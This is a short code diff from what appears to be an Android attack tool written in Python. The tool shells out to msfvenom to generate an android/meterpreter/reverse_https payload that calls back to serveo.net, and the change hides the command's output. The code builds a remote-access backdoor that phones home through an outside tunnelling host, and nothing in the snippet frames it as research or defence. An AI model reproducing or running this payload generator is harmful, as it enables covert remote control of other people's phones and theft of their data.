@@ -64,7 +64,7 @@ time.sleep(7)
 
 def generate():
  print('\n')
- generate = subprocess.call(f"msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT={port} R> $HOME/Lemon/{name}", shell=True)
+ generate = subprocess.call(f"msfvenom -p android/meterpreter/reverse_https LHOST=serveo.net LPORT={port} R> $HOME/Lemon/{name}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
 
 gen = threading.Thread(target=generate)
 gen.daemon=True
